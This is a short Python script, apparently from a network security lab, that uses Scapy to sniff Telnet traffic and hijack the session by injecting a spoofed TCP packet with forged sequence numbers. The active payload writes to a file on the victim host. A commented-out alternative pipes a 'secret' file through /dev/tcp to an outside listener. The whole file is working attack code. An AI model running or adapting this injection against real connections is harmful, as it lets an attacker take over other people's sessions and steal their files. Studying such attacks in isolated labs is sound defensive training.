from scapy.all import *

def sniffAndHijack(pkt):
	old_seq = pkt[TCP].seq
	old_ack = pkt[TCP].ack
	ip = IP(src=pkt[IP].dst, dst=pkt[IP].src)
	tcp = TCP(sport=pkt[TCP].dport, dport=pkt[TCP].sport, flags="A", seq=old_ack+5, ack=old_seq)
	# Crafting the payload: sending the command as if a user types it
	# data = "\r cat secret > /dev/tcp/10.9.0.1/9090 \r"
	data = "\r echo HIJACK!! >> hello.txt \r"
	spoofedPkt = ip/tcp/data
	send(spoofedPkt,iface="br-c26fa13374f9")

# Sniffing on specified interface for TCP packets on port 23
sniff(iface='br-c26fa13374f9', filter='tcp and src host 10.9.0.5 and src port 23', prn=sniffAndHijack)

